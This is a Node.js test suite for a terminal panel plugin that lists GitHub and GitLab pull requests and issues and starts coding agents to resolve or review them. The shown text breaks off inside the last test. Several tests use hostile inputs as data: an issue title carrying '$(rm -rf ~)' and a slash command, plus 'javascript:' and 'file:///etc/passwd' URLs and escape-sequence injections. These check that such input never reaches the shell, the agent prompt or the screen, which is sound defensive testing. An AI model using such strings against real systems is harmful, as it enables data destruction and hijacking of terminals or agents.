"use strict";
const test = require("node:test");
const assert = require("node:assert/strict");
// Record what the panel would open instead of starting a browser. panel.js reads
// spawn when it loads, so this has to come before the require below.
// The last child is kept so a test can fire its "error" or "exit" events.
const opened = [];
let lastChild = null, spawnThrows = null;
require("node:child_process").spawn = (cmd, args) => {
  if (spawnThrows) throw spawnThrows;
  opened.push(args[0]);
  const handlers = {};
  lastChild = {
    cmd,
    on(event, fn) { (handlers[event] ??= []).push(fn); return this; },
    unref() {},
    emit(event, ...rest) { for (const fn of handlers[event] ?? []) fn(...rest); },
  };
  return lastChild;
};
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
// Agent actions run herdr and mcc through execFile: answer from a scripted herdr
// and mcc instead, by the command's name, recording each call and its options.
// The panel follows pane w1:p1 from its own pane w1:p9.
const calls = [], callOpts = [];
let herdr = () => ({ code: 1, stderr: "no herdr in tests" });
let mcc = () => ({ code: 1, stderr: "no mcc in tests" });
// git answers as not a repository, unless a test scripts it. A call held returns no
// answer until the test answers it from held, as a refresh that never ends (#42).
let git = () => ({ code: 1, stderr: "no git in tests" });
let hold = () => false;
const held = [];
const answer = (cb, r) => cb(r.error ?? (r.code ? Object.assign(new Error("exit"), { code: r.code }) : null), r.stdout ?? "", r.stderr ?? "");
require("node:child_process").execFile = (cmd, args, opts, cb) => {
  const name = path.basename(cmd);
  calls.push([name, ...args]);
  callOpts.push(opts);
  if (hold(name, args)) { held.push({ name, args, answer: (r) => answer(cb, r) }); return; }
  const r = name === "herdr" ? herdr(args) : name === "mcc" ? mcc(args) : name === "git" ? git(args) : { code: 1, stderr: `no ${name} in tests` };
  setImmediate(() => answer(cb, r));
};
// The panel keeps its view and refresh interval in a state folder of its own here,
// never in the real one.
const stateDir = fs.mkdtempSync(path.join(os.tmpdir(), "herdr-github-state-"));
process.on("exit", () => fs.rmSync(stateDir, { recursive: true, force: true }));
Object.assign(process.env, { HERDR_BIN_PATH: "herdr", HERDR_PANE_ID: "w1:p9", HERDR_GITHUB_PANE: "w1:p1", HERDR_PLUGIN_STATE_DIR: stateDir });
const P = require("../profiles.cjs");
const { width, fit, wrap, ago, checks, clean, plain, prRow, issueRow, FORGES, remoteHost, pickHost, forgesFor, firstLine, ui, draw, click, onInput, act, launch, findSkill, promptFor, readStore, IDD, TIMING, follow, refresh, REFRESH, restore, poll, STATE } = require("../panel.js");
// A launch through mcc polls herdr for Claude Code in the new pane: quickly, here.
Object.assign(TIMING, { pollMs: 1, appearMs: 40 });

// Drops colors and OSC 8 hyperlinks, leaving the text a terminal shows.
const strip = (s) => s.replace(/\x1b\[[0-9;]*m/g, "").replace(/\x1b\]8;[^\x07\x1b]*(?:\x1b\\|\x07)/g, "");
const iso = (secondsAgo) => new Date(Date.now() - secondsAgo * 1000).toISOString();

test("width counts display cells", () => {
  assert.equal(width("abc"), 3);
  assert.equal(width("日本"), 4);
  assert.equal(width("e\u0301"), 1);
  assert.equal(width("🚀"), 2);
});

test("fit cuts with an ellipsis only when needed", () => {
  assert.equal(fit("hello", 5), "hello");
  assert.equal(fit("hello world", 8), "hello w…");
  assert.ok(width(fit("日本語のテキスト", 7)) <= 7);
  assert.equal(fit("anything", 0), "");
});

test("wrap breaks at words and caps the line count", () => {
  assert.deepEqual(wrap("one two three", 7, 3), ["one two", "three"]);
  const lines = wrap("alpha beta gamma delta epsilon zeta eta theta", 11, 2);
  assert.equal(lines.length, 2);
  assert.ok(lines[1].endsWith("…"));
  for (const l of lines) assert.ok(width(l) <= 11);
  assert.deepEqual(wrap("abcdefghij", 4, 5), ["abcd", "efgh", "ij"]);
  assert.deepEqual(wrap("", 10, 2), []);
});

test("ago uses the app panel's units", () => {
  assert.equal(ago(iso(10)), "now");
  assert.equal(ago(iso(5 * 60)), "5m");
  assert.equal(ago(iso(3 * 3600)), "3h");
  assert.equal(ago(iso(6 * 86400)), "6d");
  assert.equal(ago(iso(61 * 86400)), "2mo");
  assert.equal(ago(iso(400 * 86400)), "1y");
});

test("checks: a failure beats pending beats pass", () => {
  assert.equal(checks([]), null);
  assert.equal(checks(undefined), null);
  assert.equal(checks([{ status: "COMPLETED", conclusion: "SUCCESS" }]), "pass");
  assert.equal(checks([{ status: "IN_PROGRESS" }, { status: "COMPLETED", conclusion: "SUCCESS" }]), "pending");
  assert.equal(checks([{ state: "PENDING" }, { conclusion: "FAILURE" }]), "fail");
});

test("clean decodes entities and drops control and zero-width characters", () => {
  assert.equal(clean("a &amp; b &lt;c&gt; &#39;d&#x27;"), "a & b <c> 'd'");
  assert.equal(clean("x&#8203;y"), "x y");
  assert.equal(clean("bell\x07\x1b[31mred"), "bell [31mred");
  assert.equal(clean("&unknown;"), "&unknown;");
});

test("plain turns markdown into one line of prose", () => {
  const md = [
    "<!-- template -->",
    "## Summary",
    "Fixes **the** `bug` in [the parser](https://x.y).",
    "",
    "```js",
    "code();",
    "```",
    "- [x] tested",
    "![shot](img.png)",
    "| a | b |",
    "| --- | --- |",
  ].join("\n");
  assert.equal(plain(md), "Fixes the bug in the parser. tested a b");
  assert.equal(plain(null), "");
});

const pr = {
  ref: "#12", title: "Add a much longer title that needs to wrap across more than one line of the panel",
  body: "Body text", author: "alice", branch: "feat/x", draft: false,
  updatedAt: iso(7200), review: "approved", checks: "pass",
};

test("prRow fits the width and shows the meta line", () => {
  for (const cols of [40, 60, 100]) {
    const lines = prRow(pr, true, cols).map(strip);
    for (const l of lines) assert.ok(width(l) <= cols, `${cols}: ${l}`);
    const meta = lines.at(-1);
    assert.match(meta, /#12 · alice/);
    assert.match(meta, /2h$/);
  }
  const wide = prRow(pr, false, 100).map(strip).at(-1);
  assert.match(wide, /#12 · alice · feat\/x/);
  assert.match(wide, /Approved ✓ 2h$/);
  assert.match(prRow({ ...pr, draft: true }, false, 80).map(strip).at(-1), /\[Draft\]/);
  assert.match(prRow({ ...pr, ref: "!12", checks: null }, false, 100).map(strip).at(-1), /!12 · alice · feat\/x .*Approved 2h$/);
});

test("issueRow shows up to 3 labels and an empty body", () => {
  const issue = {
    ref: "#7", title: "Crash", body: "", author: "bob", updatedAt: iso(60),
    labels: ["bug", "p1", "ui", "extra"].map((name) => ({ name, color: "d73a4a" })),
  };
  const lines = issueRow(issue, false, 80).map(strip);
  assert.equal(lines[1].trim(), "No description");
  assert.match(lines.at(-1), /● bug ● p1 ● ui 1m$/);
  assert.doesNotMatch(lines.at(-1), /extra/);
});

test("remoteHost reads https, ssh and scp-style remotes", () => {
  assert.equal(remoteHost("https://github.com/a/b.git"), "github.com");
  assert.equal(remoteHost("https://user:tok@GitLab.example.com:8443/g/sub/p.git"), "gitlab.example.com");
  assert.equal(remoteHost("ssh://git@gitlab.com:2222/g/p.git"), "gitlab.com");
  assert.equal(remoteHost("git@gitlab.com:g/p.git"), "gitlab.com");
  assert.equal(remoteHost("code.corp:team/p.git"), "code.corp");
  assert.equal(remoteHost("/srv/git/p.git"), null);
});

test("pickHost prefers origin, then the first remote", () => {
  const remotes = (lines) => lines.map(([n, u]) => `${n}\t${u} (fetch)\n${n}\t${u} (push)`).join("\n");
  assert.equal(pickHost(remotes([["fork", "git@github.com:me/p.git"], ["origin", "git@gitlab.com:g/p.git"]])), "gitlab.com");
  assert.equal(pickHost(remotes([["upstream", "https://github.com/o/p"]])), "github.com");
  assert.equal(pickHost(""), null);
});

test("forgesFor picks by host name, and tries both for a self-hosted one", () => {
  assert.deepEqual(forgesFor("github.com"), ["github"]);
  assert.deepEqual(forgesFor("github.corp.example"), ["github"]);
  assert.deepEqual(forgesFor("gitlab.com"), ["gitlab"]);
  assert.deepEqual(forgesFor("git.example.org"), ["github", "gitlab"]);
});

test("GitHub JSON maps to the row shape", () => {
  const { github } = FORGES;
  assert.deepEqual(github.repo({ nameWithOwner: "o/p", url: "https://github.com/o/p" }), { name: "o/p", url: "https://github.com/o/p" });
  const p = github.toPr({
    number: 3, title: "Fix", body: "## Why\nBecause", author: { login: "ann" }, isDraft: true, headRefName: "fix",
    updatedAt: "2026-01-01T00:00:00Z", url: "u", reviewDecision: "CHANGES_REQUESTED", statusCheckRollup: [{ state: "PENDING" }],
  });
  assert.deepEqual(p, { ref: "#3", number: 3, title: "Fix", body: "Because", author: "ann", branch: "fix", draft: true, review: "changes", checks: "pending", updatedAt: "2026-01-01T00:00:00Z", url: "u" });
  const i = github.toIssue({ number: 4, title: "Bug", body: "", author: { login: "ann" }, labels: [{ name: "bug", color: "d73a4a" }], updatedAt: "t", url: "u" });
  assert.deepEqual(i.labels, [{ name: "bug", color: "d73a4a" }]);
  assert.equal(i.ref, "#4");
  assert.equal(i.number, 4);
});

test("GitLab JSON maps to the row shape", () => {
  const { gitlab } = FORGES;
  assert.deepEqual(gitlab.repo({ path_with_namespace: "g/sub/p", web_url: "https://gitlab.com/g/sub/p" }), { name: "g/sub/p", url: "https://gitlab.com/g/sub/p" });
  const mr = {
    iid: 4270, title: "fix(release): keep notes", description: "## Description\n\nKeeps the <b>notes</b>.", draft: false,
    source_branch: "8703-keep", author: { username: "amegahed12" }, detailed_merge_status: "requested_changes",
    updated_at: "2026-10-31T22:26:56.631Z", web_url: "https://gitlab.com/g/p/-/merge_requests/4270",
  };
  assert.deepEqual(gitlab.toPr(mr), {
    ref: "!4270", number: 4270, title: "fix(release): keep notes", body: "Keeps the notes .", author: "amegahed12", branch: "8703-keep",
    draft: false, review: "changes", checks: null, updatedAt: mr.updated_at, url: mr.web_url,
  });
  assert.equal(gitlab.toPr({ ...mr, detailed_merge_status: "mergeable" }).review, null);
  assert.equal(gitlab.toPr({ ...mr, draft: undefined, work_in_progress: true }).draft, true);
  const issue = { iid: 9, title: "Crash", description: null, author: { username: "bob" }, labels: ["bug", "type::feature"], updated_at: "t", web_url: "u" };
  const i = gitlab.toIssue(issue, { bug: "#d9534f" });
  assert.deepEqual(i, { ref: "#9", number: 9, title: "Crash", body: "", author: "bob", labels: [{ name: "bug", color: "d9534f" }, { name: "type::feature", color: "" }], updatedAt: "t", url: "u" });
  const row = issueRow({ ...i, updatedAt: iso(60) }, false, 80).map(strip).at(-1);
  assert.match(row, /#9 · bob .*● bug ● type::feature 1m$/);
});

test("firstLine skips blank lines and glab's ERROR heading", () => {
  assert.equal(firstLine("\n   ERROR  \n\n  Get https://gitlab.com/x: 401 Unauthorized.  \n"), "Get https://gitlab.com/x: 401 Unauthorized.");
  assert.equal(firstLine("gh: not logged in\nmore"), "gh: not logged in");
  assert.equal(firstLine(""), "");
});

// ── Clicks ──────────────────────────────────────────────────────────────────

// Run fn against a 60x24 screen, returning the last frame's lines as plain text.
// stdout is node --test's channel, so it is only borrowed for the call.
function screen(fn) {
  return rawScreen(fn).map((l) => l === undefined ? l : strip(l));
}

// The same, with each line's escape sequences left in.
function rawScreen(fn) {
  const { write } = process.stdout, cols = process.stdout.columns, rows = process.stdout.rows;
  let frame = "";
  process.stdout.write = (s) => { frame = s; return true; };
  process.stdout.columns = 60; process.stdout.rows = 24;
  try { fn(); } finally { Object.assign(process.stdout, { write, columns: cols, rows }); }
  const lines = [];
  for (const m of frame.matchAll(/\x1b\[(\d+);1H(.*?)\x1b\[0m\x1b\[K/g)) lines[m[1] - 1] = m[2];
  return lines;
}

const items = (kind) => Array.from({ length: 10 }, (_, i) => ({
  ref: `#${i}`, title: `Title ${i}`, body: `Body ${i}`, author: "a", labels: [], updatedAt: iso(60), url: `https://x/${kind}/${i}`,
}));

function setup(view) {
  Object.assign(ui, {
    view, prs: items("pull"), issues: items("issues"), errors: {}, error: null, repo: { name: "o/p", url: "https://x/o/p" },
    loading: false, fetched: true, follow: false, sel: { prs: 0, issues: 0 }, top: { prs: 0, issues: 0 }, notice: null,
    forge: null, root: null, settings: null, acting: null, menu: null,
  });
  follow("w1:p1");
  opened.length = 0;
  return screen(draw);
}

// SGR mouse events, as herdr sends them with mouse capture on (1-based x;y).
const press = (y) => `\x1b[<0;5;${y + 1}M\x1b[<0;5;${y + 1}m`;
const wheelDown = "\x1b[<65;5;10M";
// Lines 0-3 are the header and the switch, 4-22 the list, 23 the key hints.
const LIST = { from: 4, to: 22 }, FOOTER = 23;

test("a click on a pull request opens that pull request", () => {
  const lines = setup("prs");
  const y = lines.findIndex((l) => l?.includes("Title 3"));
  assert.ok(y >= LIST.from);
  screen(() => onInput(Buffer.from(press(y))));
  assert.deepEqual(opened, ["https://x/pull/3"]);
  assert.equal(ui.sel.prs, 3);
});

test("a click on an issue opens that issue", () => {
  const lines = setup("issues");
  const y = lines.findIndex((l) => l?.includes("Body 2"));
  screen(() => click(5, y));
  assert.deepEqual(opened, ["https://x/issues/2"]);
  assert.equal(ui.sel.issues, 2);
});

test("after scrolling, each row opens the item drawn on it and gaps open nothing", () => {
  setup("prs");
  const lines = screen(() => onInput(Buffer.from(wheelDown + wheelDown)));
  assert.ok(ui.top.prs > 0);
  let hits = 0;
  for (let y = LIST.from; y <= FOOTER; y++) {
    opened.length = 0;
    const sel = ui.sel.prs;
    screen(() => onInput(Buffer.from(press(y))));
    if (y === FOOTER || lines[y].trim() === "") {
      assert.deepEqual(opened, [], `line ${y} is not a row`);
      assert.equal(ui.sel.prs, sel, `line ${y} is not a row`);
      continue;
    }
    assert.equal(opened.length, 1, `line ${y}: ${lines[y]}`);
    const k = opened[0].split("/").at(-1);
    assert.ok([`Title ${k}`, `Body ${k}`, `#${k} ·`].some((t) => lines[y].includes(t)), `line ${y} "${lines[y]}" opened ${opened[0]}`);
    hits++;
  }
  assert.ok(hits > 10);
});

test("a click leaves the lists and the scroll position as they were", () => {
  setup("prs");
  // The selected row's URL line goes below the view, so the rows above it stay put.
  ui.sel.prs = ui.prs.length - 1;
  const lines = screen(() => onInput(Buffer.from(wheelDown + wheelDown)));
  const top = { ...ui.top }, prs = JSON.stringify(ui.prs), issues = JSON.stringify(ui.issues);
  // The bottom row is cut off: a click must not scroll to show the rest of it.
  const y = LIST.to;
  assert.match(lines[y], /Title \d/);
  screen(() => onInput(Buffer.from(press(y))));
  assert.equal(opened.length, 1);
  assert.deepEqual(ui.top, top);
  assert.equal(JSON.stringify(ui.prs), prs);
  assert.equal(JSON.stringify(ui.issues), issues);
  assert.equal(ui.view, "prs");
});

// ── When a row can't be opened ──────────────────────────────────────────────

const HINT = "Ctrl- or Cmd-click the URL to open it on your machine";
const enoent = () => Object.assign(new Error("spawn xdg-open ENOENT"), { code: "ENOENT" });

test("when the opener isn't installed, a click shows the URL and the hint", () => {
  const lines = setup("prs");
  const y = lines.findIndex((l) => l?.includes("Title 3"));
  const after = screen(() => { onInput(Buffer.from(press(y))); lastChild.emit("error", enoent()); });
  assert.deepEqual(opened, ["https://x/pull/3"]);
  assert.equal(noticeOf(after)?.url, "https://x/pull/3", "URL not shown after ENOENT");
  assert.ok(after.some((l) => l?.includes(HINT)), "hint not shown after ENOENT");
  assert.ok(after.some((l) => l?.includes(`${lastChild.cmd} not found`)));
});

const noticeOf = (lines) => {
  const at = lines.findIndex((l) => l?.includes(HINT));
  return at < 0 ? null : { reason: lines[at - 1].trim(), url: lines.slice(at + 1, FOOTER).map((l) => l.trim()).join(""), from: at - 2 };
};

test("when the opener exits with an error, enter shows the URL and the hint", () => {
  setup("prs");
  const lines = screen(() => { onInput(Buffer.from("\r")); lastChild.emit("exit", 3, null); });
  assert.deepEqual(opened, ["https://x/pull/0"]);
  assert.deepEqual(noticeOf(lines) && { ...noticeOf(lines), from: 0 }, { reason: `${lastChild.cmd} exited 3`, url: "https://x/pull/0", from: 0 });
  assert.match(lines[FOOTER], /select · ⏎ open/);
});

test("the notice never covers the row that failed to open", () => {
  setup("prs");
  // Moving down leaves the selected row on the list's bottom edge.
  const before = screen(() => onInput(Buffer.from("j".repeat(6))));
  const bottom = before.findIndex((l) => l?.includes("#6 ·"));
  assert.ok(bottom > LIST.to - 2, `#6 isn't at the bottom: ${bottom}`);
  const lines = screen(() => { onInput(Buffer.from("\r")); lastChild.emit("exit", 3, null); });
  assert.deepEqual(opened, ["https://x/pull/6"]);
  const notice = noticeOf(lines);
  assert.equal(notice?.url, "https://x/pull/6");
  for (const t of ["Title 6", "Body 6", "#6 ·"]) {
    const y = lines.findIndex((l) => l?.includes(t));
    assert.ok(y >= LIST.from && y < notice.from, `${t} is at ${y}, the notice starts at ${notice.from}`);
  }
});

test("o and the header's ↗ show the repo URL when it can't be opened", () => {
  setup("issues");
  let lines = screen(() => { onInput(Buffer.from("o")); lastChild.emit("exit", 3, null); });
  assert.equal(noticeOf(lines)?.url, "https://x/o/p");
  const x = setup("issues")[0].indexOf("↗");
  assert.ok(x > 0);
  lines = screen(() => { onInput(Buffer.from("j")); click(x, 0); lastChild.emit("error", enoent()); });
  assert.deepEqual(opened, ["https://x/o/p"]);
  assert.equal(noticeOf(lines)?.url, "https://x/o/p");
  assert.equal(noticeOf(lines)?.reason, `${lastChild.cmd} not found`);
});

test("a successful open shows nothing and leaves the frame as it was", () => {
  const before = setup("prs");
  const lines = screen(() => { onInput(Buffer.from("\r")); lastChild.emit("exit", 0, null); draw(); });
  assert.equal(opened.length, 1);
  assert.equal(ui.notice, null);
  assert.deepEqual(lines, before);
});

test("the notice goes away on the next open or key, and a stale failure is ignored", () => {
  const before = setup("prs");
  const y = before.findIndex((l) => l?.includes("Title 2"));
  screen(() => { onInput(Buffer.from("\r")); lastChild.emit("exit", 3, null); });
  assert.ok(ui.notice);
  let lines = screen(() => onInput(Buffer.from(press(y))));
  assert.deepEqual(opened, ["https://x/pull/0", "https://x/pull/2"]);
  assert.equal(noticeOf(lines), null);
  const stale = lastChild;
  screen(() => onInput(Buffer.from("o")));
  screen(() => stale.emit("exit", 3, null));
  assert.equal(ui.notice, null, "a failure from an earlier open was shown");
  lines = screen(() => lastChild.emit("exit", 3, null));
  assert.equal(noticeOf(lines)?.url, "https://x/o/p");
  lines = screen(() => onInput(Buffer.from("x")));
  assert.equal(ui.notice, null);
  assert.equal(noticeOf(lines), null);
});

test("an opener that can't even start shows the URL", () => {
  setup("prs");
  spawnThrows = new Error("bad argument");
  let lines;
  try { lines = screen(() => onInput(Buffer.from("\r"))); } finally { spawnThrows = null; }
  assert.deepEqual(noticeOf(lines) && [noticeOf(lines).reason, noticeOf(lines).url], ["bad argument", "https://x/pull/0"]);
});

test("a long URL is shown whole, wrapped, linked, and its lines open nothing", () => {
  setup("prs");
  const url = "https://github.example.com/some-organisation/a-repository-with-a-long-name/pull/12345?notification_referrer_id=abcdefghijklmnop";
  ui.prs[0].url = url;
  const raw = rawScreen(() => { onInput(Buffer.from("\r")); lastChild.emit("exit", 3, null); });
  const lines = raw.map(strip);
  const notice = noticeOf(lines);
  assert.equal(notice.url, url);
  assert.ok(lines.slice(notice.from + 3, FOOTER).length >= 2);
  for (const l of lines) assert.ok(width(l) <= 60, l);
  for (let y = notice.from + 3; y < FOOTER; y++) assert.ok(raw[y].includes(`\x1b]8;;${url}\x1b\\`), `line ${y} isn't linked`);
  for (let y = notice.from; y <= FOOTER; y++) {
    opened.length = 0;
    screen(() => click(5, y));
    assert.deepEqual(opened, [], `notice line ${y} opened something`);
  }
});

test("a notice never carries control characters from the URL or the error", () => {
  setup("prs");
  ui.prs[0].url = "https://x/\x1b]8;;https://evil\x07/\x9b2J";
  const raw = rawScreen(() => { onInput(Buffer.from("\r")); lastChild.emit("error", new Error("boom\x1b[2J\x07")); });
  const at = raw.findIndex((l) => l?.includes(HINT));
  assert.ok(at > 0);
  for (const l of raw.slice(at - 2, FOOTER)) {
    assert.doesNotMatch(l, /\x1b\]|\x07|\x9b|\x1b\[2J/, JSON.stringify(l));
  }
  assert.match(strip(raw[at - 1]), /boom/);
});

// ── Hyperlinks ──────────────────────────────────────────────────────────────

test("each title line is its own OSC 8 link to the row", () => {
  const url = "https://github.com/o/p/pull/12";
  const lines = prRow({ ...pr, url }, true, 40);
  const titles = lines.filter((l) => l.includes("\x1b]8;"));
  assert.equal(titles.length, 2);
  for (const l of titles) {
    const open = l.indexOf(`\x1b]8;;${url}\x1b\\`), close = l.lastIndexOf("\x1b]8;;\x1b\\");
    assert.ok(open >= 0 && close > open, JSON.stringify(l));
    assert.equal(l.split("\x1b]8;").length, 3);
  }
  // Same text as an unlinked row, plus the selected row's URL line.
  assert.deepEqual(lines.map(strip), [...prRow(pr, true, 40).map(strip), `▌   ${url}`]);
});

// herdr 0.9.5 skips OSC 8 links, but Ctrl-click opens a plain URL that sits whole on one line.
test("the selected row shows its URL as plain text on one line", () => {
  const url = "https://github.com/o/p/pull/12";
  const lines = prRow({ ...pr, url }, true, 40);
  assert.equal(strip(lines.at(-1)), `▌   ${url}`);
  assert.doesNotMatch(lines.at(-1), /\x1b\]8/);
  assert.equal(prRow({ ...pr, url }, false, 40).length, lines.length - 1, "only the selected row has a URL line");
  for (const bad of ["javascript:alert(1)", "https://x/\x1b]8;;https://evil\x1b\\", undefined]) {
    assert.equal(prRow({ ...pr, url: bad }, true, 40).length, lines.length - 1, JSON.stringify(bad));
  }
});

test("a URL too long for one line breaks after its scheme, so no line is a cut-off URL", () => {
  const url = "https://github.example.com/some-organisation/a-repository-with-a-long-name/pull/12345";
  const lines = prRow({ ...pr, url }, true, 40).map(strip);
  const at = lines.findIndex((l) => l.endsWith("https://"));
  assert.equal(lines[at], "▌   https://");
  const rest = lines.slice(at + 1);
  assert.ok(rest.length >= 2);
  for (const l of lines) assert.ok(width(l) <= 40, l);
  for (const l of rest) assert.doesNotMatch(l, /https?:\/\//, l);
  assert.equal(lines.slice(at).map((l) => l.slice(4)).join(""), url);
});

test("links leave the visible frame as it was", () => {
  setup("prs");
  const raw = rawScreen(draw);
  const linked = raw.map((l) => l === undefined ? l : strip(l));
  assert.ok(raw[0].includes("\x1b]8;;https://x/o/p\x1b\\"), "the repo name isn't linked");
  const y = linked.findIndex((l) => l?.includes("Title 3"));
  assert.ok(raw[y].includes("\x1b]8;;https://x/pull/3\x1b\\") && raw[y].endsWith("\x1b]8;;\x1b\\"), JSON.stringify(raw[y]));
  for (const p of ui.prs) p.url = p.url.replace("https:", "ftp:");
  ui.repo.url = "ftp://x/o/p";
  const plainRaw = rawScreen(draw);
  assert.ok(plainRaw.every((l) => !l?.includes("\x1b]8")));
  // An ftp URL gets no URL line under the selected row, so its list runs one line longer.
  const plainLines = plainRaw.map((l) => l === undefined ? l : strip(l));
  const urlLine = linked.indexOf("▌   https://x/pull/0");
  assert.ok(urlLine > 0, "the selected row's URL isn't shown");
  assert.deepEqual(linked.filter((_, i) => i !== urlLine), plainLines.filter((_, i) => i !== LIST.to));
  for (const l of linked) assert.ok(width(l ?? "") <= 60, l);
});

test("only plain http(s) URLs become links", () => {
  for (const url of ["https://x/\x1b]8;;https://evil\x1b\\", "https://x/\x07", "https://x/\x9b", "javascript:alert(1)", "file:///etc/passwd", "ftp://x/p", undefined, 42]) {
    for (const l of prRow({ ...pr, url }, true, 60)) assert.doesNotMatch(l, /\x1b\]8/, JSON.stringify(url));
  }
  assert.match(prRow({ ...pr, url: "HTTP://x/p" }, false, 60)[0], /\x1b\]8;;HTTP:\/\/x\/p\x1b\\/);
});

test("a Ctrl-click on a title is left to the terminal", () => {
  const lines = setup("prs");
  const y = lines.findIndex((l) => l?.includes("Title 3"));
  screen(() => onInput(Buffer.from(`\x1b[<16;5;${y + 1}M\x1b[<16;5;${y + 1}m`)));
  assert.deepEqual(opened, []);
  assert.equal(ui.sel.prs, 0);
});

// ── Resolve and Review with your agent ──────────────────────────────────────

// A GitHub repo whose rows are numbered from 10, the selected one being #12.
function setupGitHub(view) {
  setup(view);
  for (const v of ["prs", "issues"]) ui[v].forEach((x, i) => Object.assign(x, { ref: `#${10 + i}`, number: 10 + i }));
  Object.assign(ui, { forge: FORGES.github, root: "/repo", tab: "w1:t1", sel: { prs: 2, issues: 2 }, acting: null });
  calls.length = 0;
  callOpts.length = 0;
  return screen(draw);
}

// A HOME holding the given SKILL.md files (and plugin.json files), for one test.
function home(t, files = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "herdr-github-home-"));
  for (const [file, text] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true });
    fs.writeFileSync(path.join(dir, file), text);
  }
  const before = process.env.HOME;
  process.env.HOME = dir;
  t.after(() => { process.env.HOME = before; fs.rmSync(dir, { recursive: true, force: true }); });
  return dir;
}

// The profile store in a HOME, as the app and the panel share it.
function useProfiles(dir, profiles, assign = {}) {
  const file = path.join(dir, ".config/herdr/plugins/config/herdr-github/profiles.json");
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, JSON.stringify({ version: 1, profiles, assign }));
  return file;
}
// A HOME whose Resolve and Review start Claude Code itself, as herdr's claude agent.
function claudeHome(t, files = {}) {
  const dir = home(t, files);
  useProfiles(dir, [{ id: "cc", name: "Claude Code", harness: "claude" }], { resolve: "cc", review: "cc" });
  return dir;
}

// A herdr with these agents, where each step answers as `replies` says: a reply,
// or a function of how many times the step ran before.
const ok = (result) => ({ code: 0, stdout: JSON.stringify({ result }) });
function fakeHerdr(agents, replies = {}) {
  const seen = {};
  herdr = (args) => {
    const step = `${args[0]} ${args[1]}`;
    const n = seen[step] = (seen[step] ?? -1) + 1;
    if (replies[step]) return typeof replies[step] === "function" ? replies[step](n, args) : replies[step];
    if (step === "agent list") return ok({ agents });
    if (step === "pane split") return ok({ pane: { pane_id: "w1:p7" } });
    return ok({});
  };
}
const herdrFail = (code, message) => ({ code: 1, stderr: JSON.stringify({ error: { code, message } }) });
const claudeHere = [{ agent: "claude", pane_id: "w1:p1", tab_id: "w1:t1" }];
const herdrCalls = () => calls.filter((c) => c[0] === "herdr").map((c) => c.slice(1).join(" "));

// Like screen, for a launch: stdout stays borrowed until the launch is over. Only
// the panel's frames are taken; node --test reports through stdout meanwhile.
async function screenAsync(fn, columns = 60) {
  const { write } = process.stdout, cols = process.stdout.columns, rows = process.stdout.rows;
  let frame = "";
  process.stdout.write = function (s, ...rest) {
    if (typeof s === "string" && s.startsWith("\x1b[?2026h")) { frame = s; return true; }
    return write.call(this, s, ...rest);
  };
  process.stdout.columns = columns; process.stdout.rows = 24;
  try { fn(); await ui.acting; } finally { Object.assign(process.stdout, { write, columns: cols, rows }); }
  const lines = [];
  for (const m of frame.matchAll(/\x1b\[(\d+);1H(.*?)\x1b\[0m\x1b\[K/g)) lines[m[1] - 1] = strip(m[2]);
  return lines;
}
const buttonAt = (lines, label) => lines[0].indexOf(label);
// With more than one profile, a press opens the profile menu: these press, check that
// it opened, and press enter on the profile it highlights, the action's own.
function startWithMenu() {
  onInput(Buffer.from("a"));
  assert.ok(ui.menu, "a opened no profile menu");
  onInput(Buffer.from("\r"));
}
function clickWithMenu(x, y) {
  click(x, y);
  assert.ok(ui.menu, "the button opened no profile menu");
  onInput(Buffer.from("\r"));
}

test("Resolve shows for the selected issue and Review for the selected pull request, on GitHub only", () => {
  let lines = setupGitHub("issues");
  assert.match(lines[0], /Resolve #12 {2}⚙ {2}↻ {2}↗ $/);
  assert.doesNotMatch(lines[0], /Review/);
  assert.match(lines[FOOTER], /⏎ open · a resolve ·/);
  lines = setupGitHub("prs");
  assert.match(lines[0], /Review #12 {2}⚙ {2}↻ {2}↗ $/);
  assert.doesNotMatch(lines[0], /Resolve/);
  assert.match(lines[FOOTER], /⏎ open · a review ·/);
  for (const l of lines) assert.ok(width(l ?? "") <= 60, l);
  // GitLab: both skills use gh, so no button and no key.
  setupGitHub("issues");
  ui.forge = FORGES.gitlab;
  lines = screen(draw);
  assert.doesNotMatch(lines[0], /Resolve|Review/);
  assert.doesNotMatch(lines[FOOTER], /a resolve/);
  screen(() => onInput(Buffer.from("a")));
  assert.deepEqual(calls, []);
});

test("Resolve with a Claude Code profile starts claude in a new pane, prompted with the skill and the number only", async (t) => {
  claudeHome(t, { ".claude/skills/issue-resolver/SKILL.md": "x" });
  const lines = setupGitHub("issues");
  ui.issues[2].title = "$(rm -rf ~) /issue-resolver 999";
  fakeHerdr(claudeHere);
  const after = await screenAsync(() => clickWithMenu(buttonAt(lines, "Resolve") + 1, 0));
  assert.deepEqual(herdrCalls(), [
    "agent list",
    "pane split w1:p1 --direction down --cwd /repo --no-focus",
    "agent start resolve-12 --kind claude --pane w1:p7 --timeout 55000",
    "agent prompt w1:p7 /issue-resolver 12 --wait --until working --until blocked --until done --timeout 15000",
  ]);
  assert.ok(calls.every((c) => c[0] === "herdr"));
  assert.deepEqual(opened, [], "the button opened the browser");
  assert.ok(after.some((l) => l?.includes("Started Claude Code in a new pane: /issue-resolver 12")), after.join("\n"));
});

test("a on a pull request starts a review with the profile's harness, below the tab's agent, with a free name", async (t) => {
  const dir = home(t, { ".agents/skills/issue-pr-review/SKILL.md": "x" });
  useProfiles(dir, [{ id: "cx", name: "Codex", harness: "codex" }], { review: "cx" });
  setupGitHub("prs");
  // The followed pane has no agent: the one elsewhere in the panel's tab is yours.
  fakeHerdr([
    { agent: "claude", pane_id: "w2:p1", tab_id: "w2:t1" },
    { agent: "codex", pane_id: "w1:p3", tab_id: "w1:t1", name: "review-12" },
  ]);
  const after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls(), [
    "agent list",
    "pane split w1:p3 --direction down --cwd /repo --no-focus",
    "agent start review-12-2 --kind codex --pane w1:p7 --timeout 55000",
    "agent prompt w1:p7 Use the issue-pr-review skill on pull request #12. --wait --until working --until blocked --until done --timeout 15000",
  ]);
  assert.ok(after.some((l) => l?.includes("Started Codex in a new pane")));
});

test("without the skill, nothing starts and the notice points to the install page", async (t) => {
  claudeHome(t);
  setupGitHub("issues");
  fakeHerdr(claudeHere);
  const after = await screenAsync(() => startWithMenu());
  assert.deepEqual(herdrCalls(), ["agent list"]);
